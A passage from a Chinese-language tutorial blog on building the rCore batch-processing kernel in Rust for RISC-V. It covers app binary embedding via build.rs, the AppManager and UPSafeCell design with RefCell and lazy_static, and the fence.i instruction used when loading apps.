app_1_start<br>    .quad app_2_start<br>    .quad app_3_start<br>    .quad app_4_start<br>    .quad app_4_end<br><br>    .section .data<br>    .global app_0_start<br>    .global app_0_end<br>app_0_start:<br>    .incbin <span class="hljs-string">&quot;../user/target/riscv64gc-unknown-none-elf/release/00hello_world.bin&quot;</span><br>app_0_end:<br><br>    .section .data<br>    .global app_1_start<br>    .global app_1_end<br>app_1_start:<br>    .incbin <span class="hljs-string">&quot;../user/target/riscv64gc-unknown-none-elf/release/01store_fault.bin&quot;</span><br>app_1_end:<br><br>    .section .data<br>    .global app_2_start<br>    .global app_2_end<br>app_2_start:<br>    .incbin <span class="hljs-string">&quot;../user/target/riscv64gc-unknown-none-elf/release/02power.bin&quot;</span><br>app_2_end:<br><br>    .section .data<br>    .global app_3_start<br>    .global app_3_end<br>app_3_start:<br>    .incbin <span class="hljs-string">&quot;../user/target/riscv64gc-unknown-none-elf/release/03priv_inst.bin&quot;</span><br>app_3_end:<br><br>    .section .data<br>    .global app_4_start<br>    .global app_4_end<br>app_4_start:<br>    .incbin <span class="hljs-string">&quot;../user/target/riscv64gc-unknown-none-elf/release/04priv_csr.bin&quot;</span><br>app_4_end:<br></code></pre></td></tr></table></figure><p>在构建操作系统(make run)时由由脚本<code>os/build.rs</code>自动生成，很好理解</p><div class="note note-info">            <p><em>build.rs</em>如下，可自行探索😌</p> <figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">use</span> std::fs::&#123;File, read_dir&#125;;<br><span class="hljs-keyword">use</span> std::io::&#123;<span class="hljs-type">Result</span>, Write&#125;;<br><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;cargo:rerun-if-changed=../user/src/&quot;</span>);<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;cargo:rerun-if-changed=&#123;&#125;&quot;</span>, TARGET_PATH);<br>    <span class="hljs-title function_ invoke__">insert_app_data</span>().<span class="hljs-title function_ invoke__">unwrap</span>();<br>&#125;<br><br><span class="hljs-keyword">static</span> TARGET_PATH: &amp;<span class="hljs-type">str</span> = <span class="hljs-string">&quot;../user/target/riscv64gc-unknown-none-elf/release/&quot;</span>;<br><br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">insert_app_data</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;()&gt; &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">f</span> = File::<span class="hljs-title function_ invoke__">create</span>(<span class="hljs-string">&quot;src/link_app.S&quot;</span>).<span class="hljs-title function_ invoke__">unwrap</span>();<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">apps</span>: <span class="hljs-type">Vec</span>&lt;_&gt; = <span class="hljs-title function_ invoke__">read_dir</span>(<span class="hljs-string">&quot;../user/src/bin&quot;</span>)<br>        .<span class="hljs-title function_ invoke__">unwrap</span>()<br>        .<span class="hljs-title function_ invoke__">into_iter</span>()<br>        .<span class="hljs-title function_ invoke__">map</span>(|dir_entry| &#123;<br>            <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">name_with_ext</span> = dir_entry.<span class="hljs-title function_ invoke__">unwrap</span>().<span class="hljs-title function_ invoke__">file_name</span>().<span class="hljs-title function_ invoke__">into_string</span>().<span class="hljs-title function_ invoke__">unwrap</span>();<br>            name_with_ext.<span class="hljs-title function_ invoke__">drain</span>(name_with_ext.<span class="hljs-title function_ invoke__">find</span>(<span class="hljs-string">&#x27;.&#x27;</span>).<span class="hljs-title function_ invoke__">unwrap</span>()..name_with_ext.<span class="hljs-title function_ invoke__">len</span>());<br>            name_with_ext<br>        &#125;)<br>        .<span class="hljs-title function_ invoke__">collect</span>();<br>    apps.<span class="hljs-title function_ invoke__">sort</span>();<br><br>    <span class="hljs-built_in">writeln!</span>(<br>        f,<br>        <span class="hljs-string">r#&quot;</span><br><span class="hljs-string">    .align 3</span><br><span class="hljs-string">    .section .data</span><br><span class="hljs-string">    .global _num_app</span><br><span class="hljs-string">_num_app:</span><br><span class="hljs-string">    .quad &#123;&#125;&quot;#</span>,<br>        apps.<span class="hljs-title function_ invoke__">len</span>()<br>    )?;<br><br>    <span class="hljs-keyword">for</span> <span class="hljs-variable">i</span> <span class="hljs-keyword">in</span> <span class="hljs-number">0</span>..apps.<span class="hljs-title function_ invoke__">len</span>() &#123;<br>        <span class="hljs-built_in">writeln!</span>(f, <span class="hljs-string">r#&quot;    .quad app_&#123;&#125;_start&quot;#</span>, i)?;<br>    &#125;<br>    <span class="hljs-built_in">writeln!</span>(f, <span class="hljs-string">r#&quot;    .quad app_&#123;&#125;_end&quot;#</span>, apps.<span class="hljs-title function_ invoke__">len</span>() - <span class="hljs-number">1</span>)?;<br><br>    <span class="hljs-keyword">for</span> (idx, app) <span class="hljs-keyword">in</span> apps.<span class="hljs-title function_ invoke__">iter</span>().<span class="hljs-title function_ invoke__">enumerate</span>() &#123;<br>        <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;app_&#123;&#125;: &#123;&#125;&quot;</span>, idx, app);<br>        <span class="hljs-built_in">writeln!</span>(<br>            f,<br>            <span class="hljs-string">r#&quot;</span><br><span class="hljs-string">    .section .data</span><br><span class="hljs-string">    .global app_&#123;0&#125;_start</span><br><span class="hljs-string">    .global app_&#123;0&#125;_end</span><br><span class="hljs-string">app_&#123;0&#125;_start:</span><br><span class="hljs-string">    .incbin &quot;&#123;2&#125;&#123;1&#125;.bin&quot;</span><br><span class="hljs-string">app_&#123;0&#125;_end:&quot;#</span>,<br>            idx, app, TARGET_PATH<br>        )?;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">Ok</span>(())<br>&#125;<br></code></pre></td></tr></table></figure>           </div><p>为了找到并加载应用程序二进制码，我们需要实现一个应用管理器，保存应用数量和各自的位置信息，以及当前执行到第几个应用了</p><p>并根据应用程序位置信息，初始化好应用所需内存空间，并加载应用执行</p><p>应用管理器<code>AppManager</code>结构体定义如下:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">// os/src/batch.rs</span><br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">AppManager</span> &#123;<br>    num_app: <span class="hljs-type">usize</span>,<br>    current_app: <span class="hljs-type">usize</span>,<br>    app_start: [<span class="hljs-type">usize</span>; MAX_APP_NUM + <span class="hljs-number">1</span>],<br>&#125;<br></code></pre></td></tr></table></figure><p>定义很好理解，但接下来我们要解决一个很神秘的问题…</p><p>我们希望将<em>AppManager</em>实例化为一个<strong>全局变量</strong>，使得任何函数都可以直接访问</p><p>但是!</p><p>里面的<code>current_app</code>字段表示当前执行的是第几个应用，它是一个可修改的变量，会在系统运行期间发生变化!</p><p>第一个想法是用<code>static mut</code></p><p>显然这是<strong>unsafe</strong>的</p><p>而我们要在编程中尽量避免使用<code>unsafe</code>，这样才能让编译器负责更多的安全性检查</p><p>因此，我们需要考虑如何在尽量避免触及unsafe的情况下仍能声明并使用可变的全局变量</p><div class="note note-info">            <p><strong>Rust Tips : Rust 所有权模型和借用检查</strong></p> <p>这里简单介绍一下 Rust 的<strong>所有权模型</strong>。它可以用一句话来概括:<code>值</code>(Value)在同一时间只能被绑定到一个<code>变量</code>(Variable)上。这里，<em>值</em>指的是储存在内存中固定位置，且格式属于某种特定类型的数据；而变量就是我们在 Rust 代码中通过 let 声明的局部变量或者函数的参数等，变量的类型与值的类型相匹配。在这种情况下，我们称值的<strong>所有权</strong>(Ownership)属于它被绑定到的变量，且变量可以作为访问&#x2F;控制绑定到它上面的值的一个媒介。变量可以将它拥有的值的所有权转移给其他变量，或者当变量退出其作用域之后，它拥有的值也会被销毁，这意味着值占用的内存或其他资源会被回收</p> <p>有些场景下，特别是在函数调用的时候，我们并不希望将当前上下文中的值的所有权转移到其他上下文中，因此类似于 C&#x2F;C++ 中的按引用传参，Rust可以使用<code>&amp;</code>或<code>&amp;mut</code>后面加上值被绑定到的变量的名字来分别生成值的<em>不可变引用</em>和<em>可变引用</em>，我们称这些引用分别$不可变&#x2F;可变$借用(Borrow)它们引用的值。顾名思义，我们可以通过可变引用来修改它借用的值，但通过不可变引用则只能读取而不能修改。这些引用同样是需要被绑定到变量上的值，只是它们的类型是引用类型。在 Rust 中，引用类型的使用需要被编译器检查，但在数据表达上，和 C 的指针一样它只记录它借用的值所在的地址，因此在内存中它随平台不同仅会占据 4 字节或 8 字节空间</p> <p>无论值的类型是否是引用类型，我们都定义值的<strong>生存</strong>(Lifetime)为代码执行期间该值必须持续合法的代码区域集合，大概可以理解为该值在代码中的哪些地方被用到了，简单情况下，它可能等同于拥有它的变量的作用域，也有可能是从它被绑定开始直到它的拥有者变量最后一次出现或是它被解绑</p> <p>当我们使用 &amp; 和 &amp;mut 来借用值的时候，我们编写的代码必须满足某些约束条件，不然无法通过编译:</p> <ul> <li><p>不可变&#x2F;可变引用的生存期不能<strong>超出</strong>(Outlive)它们借用的值的生存期，前者必须是后者的子集</p> </li> <li><p>同一时间，借用同一个值的不可变和可变引用不能共存</p> </li> <li><p>同一时间，借用同一个值的不可变引用可以存在多个，但可变引用只能存在一个</p> </li> </ul> <p>这是为了 Rust <strong>内存安全</strong>而设计的重要约束条件。第一条很好理解，如果值的生存期未能完全覆盖借用它的引用的生存期，就会在某一时刻发生值已被销毁而我们仍然尝试通过引用来访问该值的情形。反过来说，显然当值合法时引用才有意义。最典型的例子是<strong>悬垂指针</strong>(Dangling Pointer)问题，即我们尝试在一个函数中返回函数中声明的局部变量的引用，并在调用者函数中试图通过该引用访问<code>已被销毁的局部变量</code>，这会产生未定义行为并导致错误。第二，三条的主要目的则是为了避免通过多个引用对同一个值进行的读写操作产生冲突。例如，当对同一个值的读操作和写操作在时间上相互交错时(即不可变&#x2F;可变引用的生存期部分重叠)，读操作便有可能读到被修改到一半的值，通常这会是一个不合法的值从而导致程序无法正确运行。这可能是由于我们在编程上的疏忽，使得我们在读取一个值的时候忘记它目前正处在被修改到一半的状态，一个可能的例子是在 C++ 中正对容器进行迭代访问的时候修改了容器本身。也有可能被归结为<strong>别名</strong>(Aliasing)问题，例如在 C 函数中有两个指针参数，如果它们指向相同的地址且编译器没有注意到这一点就进行过激的优化，将会使得编译结果偏离我们期望的语义</p> <p>上述约束条件要求借用同一个值的不可变引用和不可变&#x2F;可变引用的<code>生存期相互隔离</code>，从而能够解决这些问题。Rust<em>编译器</em>会在编译时使用<strong>借用检查器</strong>(Borrow Checker)检查这些约束条件是否被满足。其具体做法是尽可能精确的估计引用和值的生存期并将它们进行比较。随着 Rust 语言的愈发完善，其估计的精确度也会越来越高，使得程序员能够更容易通过借用检查。引用相关的借用检查发生在编译期，因此我们可以称其为<code>编译期借用检查</code></p> <p>相对的，对值的借用方式运行时可变的情况下，我们可以使用 Rust 内置的数据结构将借用检查推迟到运行时，这可以称为<strong>运行时借用检查</strong>，它的约束条件和<code>编译期借用检查</code>一致。当我们想要发起借用或终止借用时，只需调用对应数据结构提供的<strong>接口</strong>即可。值的借用状态会占用一部分额外内存，运行时还会有额外的代码对借用合法性进行检查，这是$为满足借用方式的灵活性产生的必要开销$。当无法通过借用检查时，将会产生一个不可恢复错误，导致程序打印错误信息并立即退出。具体来说，我们通常使用<strong>RefCell</strong>包裹可被借用的值，随后调用<code>borrow</code>和<code>borrow_mut</code>便可发起借用并获得一个对值的不可变&#x2F;可变借用的标志，它们可以像引用一样使用。为了终止借用，我们只需手动销毁这些标志或者等待它们被自动销毁~</p> <p>RefCell的详细用法请参考:</p> <p><a href="https://doc.rust-lang.org/stable/std/cell/struct.RefCell.html">https://doc.rust-lang.org/stable/std/cell/struct.RefCell.html</a></p>           </div><p>如果单独使用 static 而去掉 mut 的话，我们可以声明一个初始化之后就不可变的<em>全局变量</em>，但是我们需要 AppManager 里面的内容在运行时发生变化</p><p>这涉及到 Rust 中的<strong>内部可变性</strong>(Interior Mutability)，也即在变量自身不可变或仅在不可变借用的情况下仍能修改绑定到变量上的值</p><p>我们可以通过用上面提到的 RefCell 来包裹AppManager，这样 RefCell 无需被声明为mut，同时被包裹的 AppManager 也能被修改</p><p>但是，我们能否将 RefCell 声明为一个全局变量呢？</p><p>试一试吧…</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">// https://play.rust-lang.org/?version=stable&amp;mode=debug&amp;edition=2021&amp;gist=18b0f956b83e6a8a408215edcfcb6d01</span><br><span class="hljs-keyword">use</span> std::cell::RefCell;<br><span class="hljs-keyword">static</span> A: RefCell&lt;<span class="hljs-type">i32</span>&gt; = RefCell::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-number">3</span>);<br><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() &#123;<br>    *A.<span class="hljs-title function_ invoke__">borrow_mut</span>() = <span class="hljs-number">4</span>;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, A.<span class="hljs-title function_ invoke__">borrow</span>());<br>&#125;<br></code></pre></td></tr></table></figure><p>结果是无法通过编译，报错:</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs excel">error[<span class="hljs-symbol">E0277</span>]<span class="hljs-symbol">:</span> `RefCell&lt;<span class="hljs-symbol">i32</span>&gt;` cannot be shared between threads safely<br>--&gt; src/main.<span class="hljs-symbol">rs:2</span><span class="hljs-symbol">:1</span><br>|<br><span class="hljs-number">2</span> | static <span class="hljs-symbol">A:</span> RefCell&lt;<span class="hljs-symbol">i32</span>&gt; = RefCe<span class="hljs-symbol">ll:</span><span class="hljs-symbol">:ne</span>w(<span class="hljs-number">3</span>);<br>| ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ `RefCell&lt;<span class="hljs-symbol">i32</span>&gt;` cannot be shared between threads safely<br>|<br>= he<span class="hljs-symbol">lp:</span> the trait `Sync` is <span class="hljs-built_in">not</span> implemented for `RefCell&lt;<span class="hljs-symbol">i32</span>&gt;`<br>= no<span class="hljs-symbol">te:</span> shared static variables must have a <span class="hljs-built_in">type</span> that implements `Sync`<br><br>For more information about this error, try `rustc --explain <span class="hljs-symbol">E0277</span>`.<br></code></pre></td></tr></table></figure><p>Rust编译器提示我们<code>RefCell&lt;i32&gt;</code>未被标记为<code>Sync</code>，因此 Rust 编译器认为它不能被安全的在<strong>线程</strong>间共享，也就不能作为全局变量使用</p><p>但是，搞笑呢，我们这只是一个单线程程序，没有任何线程间共享数据的行为，为什么不能通过编译呢</p><p>原来，Rust对于<strong>并发安全</strong>的检查较为粗糙，当声明一个全局变量的时候，编译器会$默认$程序员会在<code>多线程</code>上使用它，而并不会检查程序员是否真的这样做</p><p>如果一个变量实际上仅会在单线程上使用，那 Rust 会期待我们将变量分配在<code>栈</code>上作为<strong>局部变量</strong>而不是全局变量</p><p>但是显然这不能满足我们的需求</p><p>怎么办呢?</p><p>我们在 RefCell 的基础上再$封装$一个UPSafeCell，从而允许我们在<strong>单核</strong>上安全使用可变全局变量</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">// os/src/sync/up.rs</span><br><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">UPSafeCell</span>&lt;T&gt; &#123;<br>    <span class="hljs-comment">/// inner data</span><br>    inner: RefCell&lt;T&gt;,<br>&#125;<br><br><span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">impl</span>&lt;T&gt; <span class="hljs-built_in">Sync</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">UPSafeCell</span>&lt;T&gt; &#123;&#125;<br><br><span class="hljs-keyword">impl</span>&lt;T&gt; UPSafeCell&lt;T&gt; &#123;<br>    <span class="hljs-comment">/// User is responsible to guarantee that inner struct is only used in</span><br>    <span class="hljs-comment">/// uniprocessor.</span><br>    <span class="hljs-keyword">pub</span> <span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">new</span>(value: T) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> &#123;<br>        <span class="hljs-keyword">Self</span> &#123; inner: RefCell::<span class="hljs-title function_ invoke__">new</span>(value) &#125;<br>    &#125;<br>    <span class="hljs-comment">/// Panic if the data has been borrowed.</span><br>    <span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">exclusive_access</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> RefMut&lt;<span class="hljs-symbol">&#x27;_</span>, T&gt; &#123;<br>        <span class="hljs-keyword">self</span>.inner.<span class="hljs-title function_ invoke__">borrow_mut</span>()<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这样当我们要访问数据时(无论读还是写)，需要首先调用<code>exclusive_access</code>获得数据的可变借用标记，通过它可以完成数据的读写</p><p>在操作完成之后我们需要<code>销毁</code>这个标记，此后才能开始对该数据的下一次访问~</p><div class="note note-danger">            <p>自己注意一下<strong>unsafe</strong>操作 🤨</p>           </div><p>现在我们就能以<em>尽量少</em>的<code>unsafe code</code>来初始化AppManager的全局实例<code>APP_MANAGER</code>了!</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">// os/src/batch.rs</span><br><br>lazy_static! &#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">ref</span> APP_MANAGER: UPSafeCell&lt;AppManager&gt; = <span class="hljs-keyword">unsafe</span> &#123; UPSafeCell::<span class="hljs-title function_ invoke__">new</span>(&#123;<br>        <span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123; <span class="hljs-keyword">fn</span> <span class="hljs-title function_">_num_app</span>(); &#125;<br>        <span class="hljs-keyword">let</span> <span class="hljs-variable">num_app_ptr</span> = _num_app <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span> <span class="hljs-keyword">as</span> *<span class="hljs-keyword">const</span> <span class="hljs-type">usize</span>;<br>        <span class="hljs-keyword">let</span> <span class="hljs-variable">num_app</span> = num_app_ptr.<span class="hljs-title function_ invoke__">read_volatile</span>();<br>        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">app_start</span>: [<span class="hljs-type">usize</span>; MAX_APP_NUM + <span class="hljs-number">1</span>] = [<span class="hljs-number">0</span>; MAX_APP_NUM + <span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">let</span> <span class="hljs-variable">app_start_raw</span>: &amp;[<span class="hljs-type">usize</span>] =  core::slice::<span class="hljs-title function_ invoke__">from_raw_parts</span>(<br>            num_app_ptr.<span class="hljs-title function_ invoke__">add</span>(<span class="hljs-number">1</span>), num_app + <span class="hljs-number">1</span><br>        );<br>        app_start[..=num_app].<span class="hljs-title function_ invoke__">copy_from_slice</span>(app_start_raw);<br>        AppManager &#123;<br>            num_app,<br>            current_app: <span class="hljs-number">0</span>,<br>            app_start,<br>        &#125;<br>    &#125;)&#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p>初始化的逻辑还是比较简单的</p><p>需要注意的是</p><p>一般情况下，全局变量必须在编译期设置一个初始值，但是有些全局变量依赖于运行期间才能得到的数据作为初始值，这导致这些全局变量需要在运行时发生变化，即需要重新设置初始值之后才能使用</p><p>因此我们使用<code>lazy_static!</code>宏以实现全局变量的运行时初始化功能</p><p>引入依赖</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment"># os/Cargo.toml</span><br><br><span class="hljs-section">[dependencies]</span><br><span class="hljs-attr">lazy_static</span> = &#123; version = <span class="hljs-string">&quot;1.4.0&quot;</span>, features = [<span class="hljs-string">&quot;spin_no_std&quot;</span>] &#125;<br></code></pre></td></tr></table></figure><p>AppManager的方法中，有<code>print_app_info</code>&#x2F;<code>get_current_app</code>&#x2F;<code>move_to_next_app</code>，都是字面意思，见下</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">print_app_info</span>(&amp;<span class="hljs-keyword">self</span>) &#123;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;there are &#123;&#125; apps totally!!!&quot;</span>, <span class="hljs-keyword">self</span>.num_app);<br>    <span class="hljs-keyword">for</span> <span class="hljs-variable">i</span> <span class="hljs-keyword">in</span> <span class="hljs-number">0</span>..<span class="hljs-keyword">self</span>.num_app &#123;<br>        <span class="hljs-built_in">println!</span>(<br>            <span class="hljs-string">&quot;[kernel] app_&#123;&#125; range [&#123;:#x&#125;, &#123;:#x&#125;)!&quot;</span>,<br>            i,<br>            <span class="hljs-keyword">self</span>.app_start[i],<br>            <span class="hljs-keyword">self</span>.app_start[i + <span class="hljs-number">1</span>]<br>        );<br>    &#125;<br>&#125;<br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">get_current_app</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">usize</span> &#123;<br>    <span class="hljs-keyword">self</span>.current_app<br>&#125;<br><br><span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">move_to_next_app</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>) &#123;<br>    <span class="hljs-keyword">self</span>.current_app += <span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>我们重点来看看<code>load_app</code></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">load_app</span>(&amp;<span class="hljs-keyword">self</span>, app_id: <span class="hljs-type">usize</span>) &#123;<br>    <span class="hljs-keyword">if</span> app_id &gt;= <span class="hljs-keyword">self</span>.num_app &#123;<br>        <span class="hljs-built_in">panic!</span>(<span class="hljs-string">&quot;All applications completed!&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[kernel] Loading app_&#123;&#125;&quot;</span>, app_id);<br>    <span class="hljs-comment">// clear app area</span><br>    core::slice::<span class="hljs-title function_ invoke__">from_raw_parts_mut</span>(<br>        APP_BASE_ADDRESS <span class="hljs-keyword">as</span> *<span class="hljs-keyword">mut</span> <span class="hljs-type">u8</span>,<br>        APP_SIZE_LIMIT<br>    ).<span class="hljs-title function_ invoke__">fill</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">app_src</span> = core::slice::<span class="hljs-title function_ invoke__">from_raw_parts</span>(<br>        <span class="hljs-keyword">self</span>.app_start[app_id] <span class="hljs-keyword">as</span> *<span class="hljs-keyword">const</span> <span class="hljs-type">u8</span>,<br>        <span class="hljs-keyword">self</span>.app_start[app_id + <span class="hljs-number">1</span>] - <span class="hljs-keyword">self</span>.app_start[app_id]<br>    );<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">app_dst</span> = core::slice::<span class="hljs-title function_ invoke__">from_raw_parts_mut</span>(<br>        APP_BASE_ADDRESS <span class="hljs-keyword">as</span> *<span class="hljs-keyword">mut</span> <span class="hljs-type">u8</span>,<br>        app_src.<span class="hljs-title function_ invoke__">len</span>()<br>    );<br>    app_dst.<span class="hljs-title function_ invoke__">copy_from_slice</span>(app_src);<br>    <span class="hljs-comment">// memory fence about fetching the instruction memory</span><br>    asm!(<span class="hljs-string">&quot;fence.i&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们首先将一块内存清空，然后找到待加载应用二进制镜像的位置，并将它复制到正确的位置</p><p>它本质上是把数据从一块内存复制到另一块内存</p><p>在这一点上也体现了冯诺依曼计算机的<strong>代码即数据</strong>的特征!</p><p>那这个神秘的<code>fence.i</code>起到什么作用呢?</p><p>我们知道<strong>缓存</strong>是存储层级结构中提高访存速度的很重要一环</p><p>而 CPU 对物理内存所做的缓存又分成<em>数据缓存</em>(d-cache)和<em>指令缓存</em>(i-cache)两部分，分别在 CPU 访存和取指的时候使用</p><p>在取指的时候，对于一个指令地址，CPU会先去<code>i-cache</code>里面看一下它是否在某个已缓存的<strong>缓存行</strong>内，如果在的话它就会直接从高速缓存中拿到指令而不是通过总线访问内存(性能 速度)</p><p>通常情况下，CPU会认为程序的代码段不会发生变化，因此<code>i-cache</code>是一种<strong>只读缓存</strong></p><p>但在这里，OS将修改会被 CPU 取指的内存区域，这会使得 i-cache 中含有与内存中不一致的内容</p><p>因此，OS在这里必须使用<strong>取指屏障指令</strong><code>fence.i</code></p><p>它的功能是保证<strong>在它之后的取指过程必须能够看到在它之前的所有对于取指内存区域的修改</strong></p><p>这样才能保证 CPU 访问的应用代码是最新的而不是<code>i-cache</code>中过时的内容</p><p>至于硬件是如何实现<code>fence.i</code>这条指令的，这一点每个硬件的具体实现方式都可能不同，比如直接清空<code>i-cache</code>中所有内容或者标记其中某些内容不合法等等…</p><p>最后，我们在<code>batch</code>子模块对外暴露出如下接口:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span 